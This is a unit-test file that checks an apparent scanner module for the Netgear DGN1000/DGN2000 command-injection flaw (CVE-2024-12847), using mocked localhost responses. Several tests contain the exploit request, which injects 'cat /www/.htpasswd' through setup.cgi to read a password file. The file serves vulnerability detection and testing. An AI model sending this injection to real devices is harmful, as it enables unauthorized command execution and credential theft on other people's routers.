"""Unit tests for CVE-2024-12847"""

import requests_mock as req_mock
from requests import exceptions as requests_exceptions

from agent import definitions
from agent.exploits import cve_2024_12847


def testNetgearDGNCommandInjection_whenVulnerable_reportFinding(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """Test case: when target is vulnerable to command injection."""
    requests_mock.get(
        "http://localhost:80/setup.cgi",
        status_code=200,
    )

    requests_mock.get(
        "http://localhost:80/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat%2B%2Fwww%2F.htpasswd&curpath=%2F&currentsetting.htm=1",
        text="admin:$1$12345678$ABCDEFGHIJKLMNOPQRSTUVWX",
        status_code=200,
    )

    exploit_instance = cve_2024_12847.NetgearDGNCommandInjectionExploit()
    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) > 0
    vulnerability = vulnerabilities[0]
    assert vulnerability.entry.title == "Netgear DGN1000/DGN2000 Unauthenticated RCE"
    assert vulnerability.entry.risk_rating == "CRITICAL"
    assert vulnerability.vulnerability_location is not None
    assert vulnerability.dna is not None


def testNetgearDGNCommandInjection_whenNotNetgear_reportNothing(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """Test case: when target is not a Netgear device."""
    requests_mock.get(
        "http://localhost:80/setup.cgi",
        status_code=200,
    )

    requests_mock.get(
        "http://localhost:80/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat%2B%2Fwww%2F.htpasswd&curpath=%2F&currentsetting.htm=1",
        status_code=401,
    )

    exploit_instance = cve_2024_12847.NetgearDGNCommandInjectionExploit()
    target = definitions.Target("http", "localhost", 80)

    vulnerabilities = exploit_instance.check(target)
    accept = exploit_instance.accept(target)

    assert accept is True
    assert len(vulnerabilities) == 0


def testNetgearDGNCommandInjection_whenCommandFails_reportNothing(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """Test case: when command injection fails."""
    requests_mock.get(
        "http://localhost:80/setup.cgi",
        headers={"WWW-Authenticate": "DGN1000"},
        status_code=401,
    )

    requests_mock.get(
        "http://localhost:80/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/www/.htpasswd&curpath=/&currentsetting.htm=1",
        text="",
        status_code=200,
    )

    exploit_instance = cve_2024_12847.NetgearDGNCommandInjectionExploit()
    target = definitions.Target("http", "localhost", 80)

    vulnerabilities = exploit_instance.check(target)

    assert len(vulnerabilities) == 0


def testNetgearDGNCommandInjection_requestException_handlingErrorLogged(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """Test case: handle RequestException in command injection detection."""
    requests_mock.get(
        "http://localhost:80/setup.cgi",
        exc=requests_exceptions.RequestException("Simulated connection error"),
    )

    exploit_instance = cve_2024_12847.NetgearDGNCommandInjectionExploit()
    target = definitions.Target("http", "localhost", 80)

    vulnerabilities = exploit_instance.check(target)

    assert len(vulnerabilities) == 0
